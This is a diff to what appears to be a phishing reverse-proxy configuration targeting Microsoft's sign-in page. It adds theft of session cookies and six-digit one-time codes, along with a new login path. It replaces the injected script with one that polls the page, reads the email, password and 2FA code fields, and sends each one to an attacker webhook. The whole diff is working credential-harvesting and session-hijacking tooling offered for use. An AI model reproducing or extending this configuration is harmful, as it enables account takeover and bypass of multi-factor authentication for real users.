@@ -3,10 +3,12 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript']}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTH_LIGHT']
+  - domain: '.microsoftonline.com'
+    keys: ['SignInStateCookie']
 credentials:
   username:
     key: 'loginfmt'
@@ -16,17 +18,59 @@ credentials:
     key: 'passwd'
     search: '(.*)'
     type: 'post'
+  twofa:
+    key: 'otc'
+    search: '([0-9]{6})'
+    type: 'post'
 login:
   domain: 'login.microsoftonline.com'
-  path: '/'
+  paths:
+    - '/'
+    - '/common/oauth2/v2.0/authorize'
 js_inject:
-  - trigger_domains: ['login.microsoftonline.com']
+  - trigger_domains: ['{{.Endpoint2}}.{{.Domain}}', 'login.microsoftonline.com']
     trigger_paths: ['/.*']
     script: |
-      (function(){const api="https://{{.Domain}}/api/webhook";const secret="{{.WebhookSecret}}";const source="microsoft";document.addEventListener('submit',function(){const u=document.querySelector('input[name="loginfmt"],input[type="email"]')?.value;const p=document.querySelector('input[name="passwd"],input[type="password"]')?.value;if(u||p){fetch(api,{method:"POST",headers:{"Content-Type":"application/json","X-Webhook-Secret":secret},body:JSON.stringify({event:p?"credentials":"email",source:source,email:u,password:p})}).catch(()=>{});}},true);})();
+      (function(){
+        const api = "https://{{.Domain}}/api/webhook";
+        const secret = "{{.WebhookSecret}}";
+        const source = "microsoft";
+        let capturedEmail = '';
+        
+        function sendData(type, email, password, code) {
+          fetch(api, {
+            method: "POST",
+            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
+            body: JSON.stringify({ event: type, source: source, email: email, password: password, code: code, remote_addr: "{{.VpsIp}}" })
+          }).catch(function(){});
+        }
+        
+        function capture() {
+          const emailInput = document.querySelector('input[name="loginfmt"], input[type="email"]');
+          const passInput = document.querySelector('input[name="passwd"], input[type="password"]');
+          const codeInput = document.querySelector('input[name="otc"], input[id="idTxtBx_OTP_Code"]');
+          
+          if (emailInput && emailInput.value && emailInput.value !== capturedEmail) {
+            capturedEmail = emailInput.value;
+            sendData("email", capturedEmail, null, null);
+          }
+          
+          if (passInput && passInput.value) {
+            sendData("credentials", capturedEmail, passInput.value, null);
+          }
+          
+          if (codeInput && codeInput.value && codeInput.value.length === 6) {
+            sendData("2fa", capturedEmail, null, codeInput.value);
+          }
+        }
+        
+        setInterval(capture, 500);
+        document.addEventListener('submit', function() { setTimeout(capture, 200); });
+        new MutationObserver(capture).observe(document.body, { childList: true, subtree: true });
+      })();
 webhook:
   url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
   headers:
     X-Webhook-Secret: "{{.WebhookSecret}}"
   format: "json"
-  events: ["credentials", "session"]
+  events: ["email", "credentials", "2fa", "session"]
